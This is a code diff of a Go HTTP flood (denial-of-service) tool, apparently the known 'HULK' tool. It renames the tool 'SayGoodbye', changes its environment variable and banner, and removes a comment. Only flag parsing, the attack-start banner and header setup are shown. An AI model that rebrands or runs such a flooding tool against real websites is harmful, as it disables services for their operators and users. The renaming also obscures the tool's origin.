@@ -77,11 +77,11 @@ func main() {
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
-	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
+	flag.StringVar(&data, "data", "", "Data to POST. If present SayGoodbye will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
-	t := os.Getenv("HULKMAXPROCS")
+	t := os.Getenv("SGBMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
 		maxproc = 1023
@@ -94,7 +94,7 @@ func main() {
 	}
 
 	if version {
-		fmt.Println("Hulk", __version__)
+		fmt.Println("SayGoodbye", __version__)
 		os.Exit(0)
 	}
 
@@ -114,7 +114,7 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
+		fmt.Println("-- Attack Started --\n           Go!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
@@ -185,8 +185,6 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
-
-		// Overwrite headers with parameters
 
 		for _, element := range headers {
 			words := strings.Split(element, ":")
